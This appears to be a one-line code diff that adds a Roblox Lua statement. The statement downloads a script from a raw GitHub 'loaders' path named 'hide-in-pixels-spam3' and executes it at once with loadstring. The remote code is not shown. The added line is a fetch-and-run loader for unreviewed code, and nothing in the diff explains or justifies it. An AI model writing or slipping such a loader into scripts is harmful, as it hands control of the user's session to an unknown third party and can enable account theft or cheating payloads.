@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/hide-in-pixels-spam3-wu4vjs79lpejj3.lua"))()
